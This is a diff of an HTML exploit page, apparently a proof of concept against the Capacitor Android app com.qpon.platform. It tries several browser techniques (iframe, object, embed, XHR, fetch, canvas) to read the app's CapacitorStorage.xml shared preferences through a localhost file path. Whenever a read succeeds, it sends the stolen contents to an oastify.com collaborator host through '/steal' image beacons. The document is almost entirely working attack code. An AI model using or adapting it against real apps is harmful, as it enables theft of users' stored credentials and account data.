@@ -1,12 +1,126 @@
-<html><head><title>X</title></head><body>
+<html><head><title>Qpon</title></head><body>
 <pre id="log"></pre>
 <script>
 var L=document.getElementById("log");
 function log(s){L.textContent+=s+"\n"}
-log("=== Account Takeover PoC ===");
-log("");
+log("=== Test ALL methods to read localhost file ===\n");
 
+var target = "https://localhost/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml";
+
+// Test 1: iframe — try to read contentDocument after load
+log("--- Test 1: iframe ---");
+var ifr = document.createElement("iframe");
+ifr.style.width="100%";
+ifr.style.height="200px";
+ifr.src = target;
+ifr.onload = function() {
+  try {
+    var doc = ifr.contentDocument || ifr.contentWindow.document;
+    var txt = doc.body ? doc.body.textContent : doc.documentElement.textContent;
+    log("[iframe] READ SUCCESS: " + txt.substring(0,200));
+    // EXFILTRATE!
+    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com   /steal?method=iframe&d=" + encodeURIComponent(txt);
+  } catch(e) {
+    log("[iframe] blocked: " + e.message);
+  }
+};
+document.body.appendChild(ifr);
+
+// Test 2: object tag
+log("--- Test 2: object ---");
+var obj = document.createElement("object");
+obj.data = target;
+obj.type = "text/xml";
+obj.style.width="100%";
+obj.style.height="200px";
+obj.onload = function() {
+  try {
+    var doc = obj.contentDocument;
+    var txt = doc.body ? doc.body.textContent : doc.documentElement.textContent;
+    log("[object] READ SUCCESS: " + txt.substring(0,200));
+    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com   /steal?method=object&d=" + encodeURIComponent(txt);
+  } catch(e) {
+    log("[object] blocked: " + e.message);
+  }
+};
+document.body.appendChild(obj);
+
+// Test 3: embed tag
+log("--- Test 3: embed ---");
+var emb = document.createElement("embed");
+emb.src = target;
+emb.type = "text/xml";
+emb.style.width="100%";
+emb.style.height="100px";
+document.body.appendChild(emb);
 setTimeout(function(){
-  window.location.href = "https://localhost/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml";
-}, 1000);
+  try {
+    var doc = emb.getSVGDocument ? emb.getSVGDocument() : null;
+    log("[embed] getSVGDocument: " + (doc ? "YES" : "null"));
+    if(doc) {
+      var txt = doc.documentElement.textContent;
+      log("[embed] READ SUCCESS: " + txt.substring(0,200));
+    }
+  } catch(e) {
+    log("[embed] blocked: " + e.message);
+  }
+}, 3000);
+
+// Test 4: XMLHttpRequest (expect CORS fail, but let's confirm)
+log("--- Test 4: XHR ---");
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target, true);
+xhr.onload = function() {
+  log("[xhr] status=" + xhr.status + " len=" + xhr.responseText.length);
+  log("[xhr] READ SUCCESS: " + xhr.responseText.substring(0,200));
+  new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com   /steal?method=xhr&d=" + encodeURIComponent(xhr.responseText);
+};
+xhr.onerror = function() { log("[xhr] error (CORS)") };
+xhr.send();
+
+// Test 5: fetch with no-cors mode
+log("--- Test 5: fetch no-cors ---");
+fetch(target, {mode:"no-cors"}).then(function(r) {
+  log("[fetch-nocors] status=" + r.status + " type=" + r.type);
+  return r.text();
+}).then(function(t) {
+  log("[fetch-nocors] text len=" + t.length);
+  if(t.length > 0) {
+    log("[fetch-nocors] READ SUCCESS: " + t.substring(0,200));
+    new Image().src = "https://qd72ei46t7kcgqvjlvqhw3c8izoqci07.oastify.com   /steal?method=fetch&d=" + encodeURIComponent(t);
+  }
+}).catch(function(e) {
+  log("[fetch-nocors] error: " + e.message);
+});
+
+// Test 6: fetch with cors mode
+log("--- Test 6: fetch cors ---");
+fetch(target).then(function(r) {
+  return r.text();
+}).then(function(t) {
+  log("[fetch-cors] READ SUCCESS: " + t.substring(0,200));
+}).catch(function(e) {
+  log("[fetch-cors] error: " + e.message);
+});
+
+// Test 7: img → canvas (won't work for XML but test CORS enforcement)
+log("--- Test 7: img+canvas ---");
+var img = new Image();
+img.crossOrigin = "anonymous";
+img.onload = function() {
+  try {
+    var c = document.createElement("canvas");
+    c.width = img.width; c.height = img.height;
+    var ctx = c.getContext("2d");
+    ctx.drawImage(img, 0, 0);
+    var data = c.toDataURL();
+    log("[canvas] READ SUCCESS: " + data.substring(0,100));
+  } catch(e) {
+    log("[canvas] tainted: " + e.message);
+  }
+};
+img.onerror = function() { log("[img] load failed (not an image)") };
+img.src = target;
+
+log("\nWaiting for results...\n");
 </script></body></html>
